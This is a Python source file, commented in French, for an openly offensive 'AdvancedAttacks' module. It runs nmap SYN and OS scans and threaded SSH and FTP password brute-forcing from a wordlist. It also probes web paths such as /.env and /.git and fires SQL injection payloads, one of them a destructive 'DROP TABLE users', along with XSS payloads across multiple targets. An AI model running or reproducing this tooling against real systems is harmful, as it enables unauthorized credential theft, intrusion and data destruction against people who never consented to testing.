#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
⚡ ADVANCED ATTACKS - Module d'attaques avancées
Multi-attack, brute force, exploitation
"""

import os
import subprocess
import threading
import socket
import paramiko
import ftplib
import smtplib
from concurrent.futures import ThreadPoolExecutor
import requests
import nmap

class AdvancedAttacks:
    def __init__(self):
        self.attack_results = []
        self.active_attacks = []
        
    def network_scan(self, target):
        """Scan réseau avancé"""
        print(f"🔍 Scan réseau: {target}")
        try:
            nm = nmap.PortScanner()
            nm.scan(target, arguments='-sS -sV -O')
            
            results = {
                'target': target,
                'hosts': nm.all_hosts(),
                'services': {}
            }
            
            for host in nm.all_hosts():
                results['services'][host] = nm[host].all_tcp()
                
            self.attack_results.append(results)
            return results
        except Exception as e:
            print(f"❌ Erreur scan: {e}")
            return None
            
    def ssh_brute_force(self, target, username, wordlist):
        """Brute force SSH"""
        print(f"🔐 SSH Brute Force: {target}")
        
        def try_password(password):
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(target, username=username, password=password, timeout=5)
                ssh.close()
                return password
            except:
                return None
                
        with ThreadPoolExecutor(max_workers=10) as executor:
            with open(wordlist, 'r') as f:
                passwords = [line.strip() for line in f]
                
            futures = [executor.submit(try_password, pwd) for pwd in passwords]
            
            for future in futures:
                result = future.result()
                if result:
                    print(f"✅ Mot de passe trouvé: {result}")
                    return result
                    
        print("❌ Aucun mot de passe trouvé")
        return None
        
    def ftp_attack(self, target, username, wordlist):
        """Attaque FTP"""
        print(f"📁 FTP Attack: {target}")
        
        def try_ftp_password(password):
            try:
                ftp = ftplib.FTP(target)
                ftp.login(username, password)
                ftp.quit()
                return password
            except:
                return None
                
        with ThreadPoolExecutor(max_workers=5) as executor:
            with open(wordlist, 'r') as f:
                passwords = [line.strip() for line in f]
                
            futures = [executor.submit(try_ftp_password, pwd) for pwd in passwords]
            
            for future in futures:
                result = future.result()
                if result:
                    print(f"✅ FTP Password: {result}")
                    return result
                    
        return None
        
    def web_enumeration(self, target):
        """Énumération web"""
        print(f"🌐 Web Enumeration: {target}")
        
        common_paths = [
            '/admin', '/login', '/wp-admin', '/phpmyadmin',
            '/config', '/backup', '/.git', '/.env',
            '/robots.txt', '/sitemap.xml', '/api'
        ]
        
        results = {
            'target': target,
            'found_paths': []
        }
        
        for path in common_paths:
            try:
                url = f"http://{target}{path}"
                response = requests.get(url, timeout=5)
                if response.status_code == 200:
                    results['found_paths'].append(path)
                    print(f"✅ Trouvé: {path}")
            except:
                pass
                
        self.attack_results.append(results)
        return results
        
    def sql_injection_test(self, target):
        """Test d'injection SQL"""
        print(f"💉 SQL Injection Test: {target}")
        
        payloads = [
            "' OR '1'='1",
            "' UNION SELECT NULL--",
            "'; DROP TABLE users--",
            "' OR 1=1#"
        ]
        
        results = {
            'target': target,
            'vulnerable': False,
            'payloads_tested': payloads
        }
        
        for payload in payloads:
            try:
                # Test basique - à adapter selon le site
                test_url = f"http://{target}/search?q={payload}"
                response = requests.get(test_url, timeout=5)
                
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    results['vulnerable'] = True
                    print(f"💉 Vulnérable avec: {payload}")
                    break
            except:
                pass
                
        self.attack_results.append(results)
        return results
        
    def xss_test(self, target):
        """Test XSS"""
        print(f"🎯 XSS Test: {target}")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<svg onload=alert('XSS')>"
        ]
        
        results = {
            'target': target,
            'vulnerable': False,
            'payloads_tested': xss_payloads
        }
        
        # Test basique - à adapter selon le site
        for payload in xss_payloads:
            try:
                test_url = f"http://{target}/search?q={payload}"
                response = requests.get(test_url, timeout=5)
                
                if payload in response.text:
                    results['vulnerable'] = True
                    print(f"🎯 XSS trouvé avec: {payload}")
                    break
            except:
                pass
                
        self.attack_results.append(results)
        return results
        
    def multi_target_attack(self, targets, attack_type):
        """Attaque multi-cibles"""
        print(f"🎯 Multi-Target Attack: {len(targets)} cibles")
        
        results = []
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            if attack_type == "scan":
                futures = [executor.submit(self.network_scan, target) for target in targets]
            elif attack_type == "web":
                futures = [executor.submit(self.web_enumeration, target) for target in targets]
            elif attack_type == "sql":
                futures = [executor.submit(self.sql_injection_test, target) for target in targets]
            elif attack_type == "xss":
                futures = [executor.submit(self.xss_test, target) for target in targets]
                
            for future in futures:
                result = future.result()
                if result:
                    results.append(result)
                    
        return results
        
    def get_attack_results(self):
        """Retourne les résultats d'attaques"""
        return self.attack_results
        
    def clear_results(self):
        """Nettoie les résultats"""
        self.attack_results = [] 